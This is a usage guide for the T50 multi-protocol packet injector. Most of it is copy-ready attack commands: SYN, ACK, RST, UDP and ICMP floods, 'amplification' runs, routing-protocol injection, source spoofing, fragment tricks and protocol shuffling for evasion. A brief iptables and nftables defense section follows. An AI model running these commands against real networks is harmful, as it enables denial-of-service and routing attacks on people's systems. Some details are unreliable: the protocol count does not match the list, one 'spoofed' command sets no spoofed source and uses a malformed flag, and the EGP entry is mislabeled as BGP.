# T50 - Multi-Protocol Packet Injector

## Overview

T50 (formerly known as "Firing Squad") is a high-performance, multi-protocol packet crafting and injection tool for Linux/Unix systems. It supports 15 different network protocols and can generate up to 1,000,000 packets per second, making it one of the fastest packet injectors available. T50 is designed for network protocol testing, security research, and firewall rule validation.

### Supported Protocols

1. TCP (Transmission Control Protocol)
2. UDP (User Datagram Protocol)
3. ICMP (Internet Control Message Protocol)
4. IGMPv2/v3 (Internet Group Management Protocol)
5. EGP (Exterior Gateway Protocol)
6. DCCP (Datagram Congestion Control Protocol)
7. RSVP (Resource Reservation Protocol)
8. RIPv1/RIPv2 (Routing Information Protocol)
9. GRE (Generic Routing Encapsulation)
10. ESP (Encapsulating Security Payload)
11. AH (Authentication Header)
12. EIGRP (Enhanced Interior Gateway Routing Protocol)
13. OSPF (Open Shortest Path First)
14. T50 (Internal protocol combining all above)

### Key Features

- CIDR notation support for subnet targeting
- TCP flag manipulation (all 8 flags)
- TCP options (MSS, Window Scale, Timestamps, SACK)
- IP fragmentation control
- Random or specified source addresses
- High-performance C implementation
- Flood mode for maximum throughput
- Encapsulated (GRE) mode
- Protocol shuffling for evasion

## Usage

### Basic Syntax

```bash
t50 <host[/cidr]> [options]
```

### Common Options

| Option | Description | Default |
|--------|-------------|---------|
| `--threshold NUM` | Packets to send | 1000 |
| `--flood` | Flood mode (supersedes threshold) | OFF |
| `--encapsulated` | GRE encapsulation | OFF |
| `-B, --bogus-csum` | Bogus checksum | OFF |
| `--shuffle` | Shuffle protocol order | OFF |
| `-q, --quiet` | Disable info output | OFF |
| `--turbo` | Extended performance | OFF |
| `-l, --list-protocols` | List available protocols | - |
| `-s, --saddr ADDR` | Source IP address | RANDOM |

### Basic Usage

```bash
# List available protocols
t50 -l

# Default test (1000 packets)
t50 192.168.1.1

# Flood mode
t50 --flood 192.168.1.1

# Specific threshold
t50 --threshold 50000 192.168.1.1

# CIDR range
t50 --threshold 10000 192.168.1.0/24
```

## Protocol-Specific Usage

### TCP Attacks

```bash
# SYN flood
t50 --flood --syn -p 80 192.168.1.1

# ACK flood
t50 --flood --ack -p 80 192.168.1.1

# RST flood (connection reset attack)
t50 --flood --rst -p 80 192.168.1.1

# FIN flood
t50 --flood --fin -p 80 192.168.1.1

# XMAS scan (FIN+PSH+URG)
t50 --flood --fin --psh --urg -p 80 192.168.1.1

# NULL scan (no flags)
t50 --flood -p 80 192.168.1.1

# Custom TCP flags
t50 --flood --syn --ack --psh -p 443 192.168.1.1
```

### TCP Options

```bash
# MSS option
t50 --flood --syn --mss 1460 -p 80 192.168.1.1

# Window scale
t50 --flood --syn --wscale 7 -p 80 192.168.1.1

# Timestamps
t50 --flood --syn --tstamp 12345678:0 -p 80 192.168.1.1

# SACK permitted
t50 --flood --syn --sack-ok -p 80 192.168.1.1

# Window size
t50 --flood --syn --window 65535 -p 80 192.168.1.1
```

### UDP Attacks

```bash
# UDP flood
t50 --flood --protocol UDP -p 53 192.168.1.1

# DNS amplification (spoofed source)
t50 --flood --protocol UDP --sport 53 -dport 1024 192.168.1.1

# NTP amplification
t50 --flood --protocol UDP --sport 123 192.168.1.1
```

### ICMP Attacks

```bash
# ICMP flood (ping flood)
t50 --flood --protocol ICMP 192.168.1.1

# ICMP redirect
t50 --flood --icmp-type 5 --icmp-gateway 10.0.0.1 192.168.1.1

# ICMP unreachable
t50 --flood --icmp-type 3 192.168.1.1

# Custom ICMP
t50 --flood --icmp-type 8 --icmp-code 0 --icmp-id 1234 192.168.1.1
```

### Routing Protocol Attacks

```bash
# OSPF LSA flood
t50 --flood --protocol OSPF --ospf-type 4 192.168.1.1

# RIP route injection
t50 --flood --protocol RIP --rip-command 2 192.168.1.1

# EIGRP flood
t50 --flood --protocol EIGRP --eigrp-opcode 1 192.168.1.1

# BGP (via EGP)
t50 --flood --protocol EGP 192.168.1.1
```

### VPN/Tunneling Protocol Attacks

```bash
# GRE tunnel flood
t50 --flood --protocol GRE 192.168.1.1

# ESP (IPSec) flood
t50 --flood --protocol ESP 192.168.1.1

# AH flood
t50 --flood --protocol AH 192.168.1.1
```

### All Protocols (T50 Mode)

```bash
# Send all protocols sequentially
t50 --flood --protocol T50 192.168.1.1
```

## Advanced Techniques

### IP Fragmentation

```bash
# Fragment packets
t50 --flood --frag-offset 1 --ttl 1 192.168.1.1

# Overlapping fragments
t50 --flood --frag-offset 0 --protocol ICMP 192.168.1.1
```

### Source Address Spoofing

```bash
# Random source (default)
t50 --flood 192.168.1.1

# Specific source
t50 --flood --saddr 10.0.0.100 192.168.1.1

# Spoofed gateway
t50 --flood --saddr 192.168.1.1 10.0.0.1
```

### Protocol Shuffling

```bash
# Shuffle protocol order for evasion

t50 --flood --shuffle --encapsulated 192.168.1.1
```

### Turbo Mode

```bash
# Maximum performance

t50 --flood --turbo -q 192.168.1.1
```

## Defense Mechanisms

### Firewall Rules

**iptables**:
```bash
# SYN flood protection
iptables -A INPUT -p tcp --syn -m limit --limit 100/s --limit-burst 200 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# ICMP rate limiting
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 10/s -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Fragment handling
iptables -A INPUT -f -j DROP

# Spoofed address blocking
iptables -A INPUT -s 127.0.0.0/8 -j DROP
iptables -A INPUT -s 10.0.0.0/8 -j DROP
```

**nftables**:
```bash
nft add rule ip filter input tcp flags syn limit rate 100/second accept
nft add rule ip filter input tcp flags syn drop
```

### Network Design

- Deploy IDS/IPS at network edge
- Implement BCP38/BCP84 (ingress filtering)
- Use dedicated security appliances
- Enable rate limiting on routers

## Advanced Protocol Analysis

### TCP Flag Combinations

| Flags | Name | Effect |
|-------|------|--------|
| SYN | Synchronize | Initiates connection |
| ACK | Acknowledge | Confirms receipt |
| RST | Reset | Terminates connection |
| FIN | Finish | Graceful close |
| PSH | Push | Immediate delivery |
| URG | Urgent | Priority data |
| ECE | ECN Echo | Congestion notification |
| CWR | Congestion Window Reduced | Congestion response |

## Limitations

- Requires root privileges for raw sockets
- Effectiveness depends on network infrastructure
- Modern equipment may have hardware-based protections
- Legal restrictions apply in many jurisdictions
- Single-source attacks may be filtered by ISP
- Cannot bypass hardware-based rate limiting
